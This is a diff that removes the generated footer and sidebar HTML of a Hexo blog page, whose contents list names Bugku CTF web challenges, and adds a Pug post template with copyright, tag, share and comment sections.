-                    <img src="https://res.cloudinary.com/tridiamond/image/upload/v1573019751/TriDiamond_logo_ui_xeublz.jpg" height=300 width=300></img>
-                    <p>Knlvre</p>
-                    <span>Think like an artist, develop like an artisan</span>
-                    <dl>
-                        <dd><a href="https://github.com/TriDiamond" target="_blank"><span
-                                    class=" iconfont icon-github"></span></a></dd>
-                        <dd><a href="https://twitter.com/TriDiamond6" target="_blank"><span
-                                    class=" iconfont icon-twitter"></span></a></dd>
-                        <dd><a href="https://stackoverflow.com/users/7602324/tridiamond?tab=profile" target="_blank"><span
-                                    class=" iconfont icon-stack-overflow"></span></a></dd>
-                    </dl>
-                </div>
-                <ul>
-                    <li><a href="/">61 <p>Articles</p></a></li>
-                    <li><a href="/categories">0 <p>Categories</p></a></li>
-                    <li><a href="/tags">9 <p>Tags</p></a></li>
-                </ul>
-            </div>
-            
-            
-            
-            <div class="box sticky animated fadeInRight faster">
-                <div id="toc" class="subbox">
-                    <h4>Contents</h4>
-                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#第二十一关（秋名山老司机）"><span class="toc-number">1.</span> <span class="toc-text">第二十一关（秋名山老司机）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第二十二关（速度要快）"><span class="toc-number">2.</span> <span class="toc-text">第二十二关（速度要快）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第二十三关（Cookies欺骗）"><span class="toc-number">3.</span> <span class="toc-text">第二十三关（Cookies欺骗）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第二十四关（Never-give-up）"><span class="toc-number">4.</span> <span class="toc-text">第二十四关（Never give up）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第二十五关（welcome-to-bugkuctf）"><span class="toc-number">5.</span> <span class="toc-text">第二十五关（welcome to bugkuctf）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第二十六关（过狗一句话）"><span class="toc-number">6.</span> <span class="toc-text">第二十六关（过狗一句话）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第二十七关（字符？正则？）"><span class="toc-number">7.</span> <span class="toc-text">第二十七关（字符？正则？）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第二十八关（前女友-SKCTF-）"><span class="toc-number">8.</span> <span class="toc-text">第二十八关（前女友(SKCTF)）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第二十九关（login1-SKCTF-）"><span class="toc-number">9.</span> <span class="toc-text">第二十九关（login1(SKCTF)）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第三十关（你从哪里来）"><span class="toc-number">10.</span> <span class="toc-text">第三十关（你从哪里来）</span></a></li></ol>
-                </div>
-            </div>
-            
-            
-        </div>
-    </div>
-</div>
-
-    </div>
-</div>
-    <div id="back-to-top" class="animated fadeIn faster">
-        <div class="flow"></div>
-        <span class="percentage animated fadeIn faster">0%</span>
-        <span class="iconfont icon-top02 animated fadeIn faster"></span>
-    </div>
-</body>
-<footer>
-    <p class="copyright" id="copyright">
-        &copy; 2019
-        <span class="gradient-text">
-            Knlvre
-        </span>.
-        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
-        Theme
-        <span class="gradient-text">
-            <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
-        </span>
-        <small><a href="https://github.com/TriDiamond/hexo-theme-obsidian/blob/master/CHANGELOG.md" title="v1.4.3" target="_blank" rel="noopener">v1.4.3</a></small>
-    </p>
-</footer>
-
-<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
-</script>
-<script>
-  MathJax.Hub.Config({
-    "HTML-CSS": {
-      preferredFont: "TeX",
-      availableFonts: ["STIX", "TeX"],
-      linebreaks: {
-        automatic: true
-      },
-      EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
-    },
-    tex2jax: {
-      inlineMath: [
-        ["$", "$"],
-        ["\\(", "\\)"]
-      ],
-      processEscapes: true,
-      ignoreClass: "tex2jax_ignore|dno",
-      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
-    },
-    TeX: {
-      noUndefined: {
-        attributes: {
-          mathcolor: "red",
-          mathbackground: "#FFEEEE",
-          mathsize: "90%"
-        }
-      },
-      Macros: {
-        href: "{}"
-      }
-    },
-    messageStyle: "none"
-  });
-</script>
-<script>
-  function initialMathJax() {
-    MathJax.Hub.Queue(function () {
-      var all = MathJax.Hub.getAllJax(),
-        i;
-      // console.log(all);
-      for (i = 0; i < all.length; i += 1) {
-        console.log(all[i].SourceElement().parentNode)
-        all[i].SourceElement().parentNode.className += ' has-jax';
-      }
-    });
-  }
-
-  function reprocessMathJax() {
-    if (typeof MathJax !== 'undefined') {
-      MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
-    }
-  }
-</script>
-
-
-
-    <link rel="stylesheet" href="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.css">
-    <script src="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.js"></script>
-
-<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
-<script src="knlvre.github.io/js/plugin.js"></script>
-<script src="knlvre.github.io/js/obsidian.js"></script>
-<script src="knlvre.github.io/js/jquery.truncate.js"></script>
-<script src="knlvre.github.io/js/search.js"></script>
-<script src="//cdn.bootcss.com/typed.js/2.0.10/typed.min.js"></script>
-<script src="//cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script>
-<script src="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
-
-<script src="https://cdn.bootcss.com/codemirror/5.48.4/codemirror.min.js"></script>
-
-    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/javascript/javascript.min.js"></script>
-
-    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/css/css.min.js"></script>
-
-    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/xml/xml.min.js"></script>
-
-    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/htmlmixed/htmlmixed.min.js"></script>
-
-    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/clike/clike.min.js"></script>
-
-    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/php/php.min.js"></script>
-
-    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/shell/shell.min.js"></script>
-
-    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/python/python.min.js"></script>
-
-
-
-    <script src="knlvre.github.io/js/busuanzi.min.js"></script>
-    <script>
-        $(document).ready(function () {
-            if ($('span[id^="busuanzi_"]').length) {
-                initialBusuanzi();
-            }
-        });
-    </script>
-
-
-<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.css">
-<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/default-skin/default-skin.min.css">
-<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.js"></script>
-<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
-
-<!-- Root element of PhotoSwipe. Must have class pswp. -->
-<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
-    <!-- Background of PhotoSwipe. 
-         It's a separate element as animating opacity is faster than rgba(). -->
-    <div class="pswp__bg"></div>
-    <!-- Slides wrapper with overflow:hidden. -->
-    <div class="pswp__scroll-wrap">
-        <!-- Container that holds slides. 
-            PhotoSwipe keeps only 3 of them in the DOM to save memory.
-            Don't modify these 3 pswp__item elements, data is added later on. -->
-        <div class="pswp__container">
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
-        </div>
-        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
-        <div class="pswp__ui pswp__ui--hidden">
-            <div class="pswp__top-bar">
-                <!--  Controls are self-explanatory. Order can be changed. -->
-                <div class="pswp__counter"></div>
-                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
-                <button class="pswp__button pswp__button--share" title="Share"></button>
-                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
-                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
-                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
-                <!-- element will get class pswp__preloader--active when preloader is running -->
-                <div class="pswp__preloader">
-                    <div class="pswp__preloader__icn">
-                      <div class="pswp__preloader__cut">
-                        <div class="pswp__preloader__donut"></div>
-                      </div>
-                    </div>
-                </div>
-            </div>
-            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
-                <div class="pswp__share-tooltip"></div> 
-            </div>
-            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
-            </button>
-            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
-            </button>
-            <div class="pswp__caption">
-                <div class="pswp__caption__center"></div>
-            </div>
-        </div>
-    </div>
-</div>
-
-
-
-    <!-- Global site tag (gtag.js) - Google Analytics -->
-    <script async src="//www.googletagmanager.com/gtag/js?id=UA-149874671-1"></script>
-    <script>
-        window.dataLayer = window.dataLayer || [];
-        function gtag(){dataLayer.push(arguments);}
-        gtag('js', new Date());
-
-        gtag('config', 'UA-149874671-1');
-    </script>
-
-
-
-
-
-<script>
-    function initialTyped () {
-        var typedTextEl = $('.typed-text');
-        if (typedTextEl && typedTextEl.length > 0) {
-            var typed = new Typed('.typed-text', {
-                strings: ["Think like an artist, develop like an artisan", "艺术家思维去思考问题，工匠创造精神去开发"],
-                typeSpeed: 90,
-                loop: true,
-                loopCount: Infinity,
-                backSpeed: 20,
-            });
-        }
-    }
-
-    if ($('.article-header') && $('.article-header').length) {
-        $(document).ready(function () {
-            initialTyped();
-        });
-    }
-</script>
-
-
-
-
-</html>
+block content
+  article#post(class="")
+    #post-content.article-container!= page.content
+  if (theme.post_copyright && theme.post_copyright.enable && page.copyright != false)
+    .post-copyright
+      .post-copyright__author
+        span.post-copyright-meta= _p('post.copyright.author') + ": "
+        span.post-copyright-info
+          a(href=`mailto:${config.email}`) #[=config.author]
+      .post-copyright__type
+        span.post-copyright-meta= _p('post.copyright.link') + ": "
+        span.post-copyright-info
+          a(href=url_for(page.permalink)) #[=page.permalink]
+      .post-copyright__notice
+        span.post-copyright-meta= _p('post.copyright.copyright_notice') + ": "
+        span.post-copyright-info!= _p('post.copyright.copyright_content', theme.post_copyright.license_url, theme.post_copyright.license, config.url, config.title)
+  
+  .tag_share
+    if (theme.post_meta.tags)
+      .post-meta__tag-list
+        each item, index in page.tags.data
+          a(href=url_for(item.path)).post-meta__tags #[=item.name]    
+    include includes/share/index.pug
+        
+  if theme.reward.enable
+    include includes/reward.pug
+  include includes/pagination.pug
+  
+  if theme.related_post && theme.related_post.enable
+    != related_posts(page,site.posts)
+  if page.comments !== false
+    include includes/comments/index.pug
